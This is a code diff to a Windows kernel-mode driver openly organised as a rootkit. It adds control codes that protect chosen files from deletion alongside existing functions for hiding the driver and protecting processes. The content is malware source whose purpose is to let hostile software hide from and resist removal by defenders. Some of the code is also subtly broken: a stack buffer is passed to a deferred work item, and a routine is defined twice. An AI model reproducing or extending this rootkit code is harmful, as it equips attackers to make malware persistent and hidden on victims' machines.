@@ -19,21 +19,17 @@ PDEVICE_OBJECT g_DeviceObject;
 Functions 
 */
 
-#ifdef DL
 VOID MsgClientWorkerRoutine(const char* MSG) {
     debug_print("[++] Called MSGClient.\n");
     MemoryHelper::MSGClient(MSG);
 }
-#endif
 
-#ifdef DL
 VOID MsgClientWorkerRoutine(PDEVICE_OBJECT DeviceObject, PVOID Context) {  
    UNREFERENCED_PARAMETER(DeviceObject);  
    const char* MSG = (const char*)Context;  
    debug_print("[++] Called MsgClientWorkerRoutine.\n");  
    MemoryHelper::MSGClient(MSG);  
-}  
-#endif
+} 
 
 KSPIN_LOCK g_Lock;
 KIRQL g_OldIrql;
@@ -105,10 +101,17 @@ namespace Rootkit {
         constexpr ULONG UnProtectProcessOP =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
 #endif
+        constexpr ULONG ProtectFile =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x704, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG UnProtectFile =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x705, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG DisableProtectionToAll =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x706, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
         WCHAR DLLName[256];
+        WCHAR Path[MAX_PATH];
     };
 
     NTSTATUS create(PDEVICE_OBJECT device_object, PIRP Irp) {
@@ -159,6 +162,7 @@ namespace Rootkit {
         const ULONG control_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
         HANDLE pid = request->process_id;
         WCHAR* DLLName = request->DLLName;
+        WCHAR* Path = request->Path;
         switch (control_code) {
         case codes::HideDriver:
             DriverObject = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
@@ -284,6 +288,34 @@ namespace Rootkit {
             }
             break;
 #endif
+        case codes::ProtectFile:
+            if (FileUtils::AddFile(Path)) {
+                char buf[256];
+                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] File: %ws is now protected from deletion.", Path);
+                if (NT_SUCCESS(status)) {
+                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+                }
+            }
+            else {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Could not protect the file from deletion.");
+            }
+            break;
+        case codes::UnProtectFile:
+            if (FileUtils::RemoveFile(Path)) {
+                char buf[256];
+                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] File: %ws is now unprotected.", Path);
+                if (NT_SUCCESS(status)) {
+                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+                }
+            }
+            else {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] File was either not protected, or could not be unprotected.");
+            }
+            break;
+        case codes::DisableProtectionToAll:
+            FileUtils::ClearFileList();
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] File Protection list cleared.");
+            break;
         default:
             // something is horribly wrong
             debug_print("[!] Unknown control code received!");
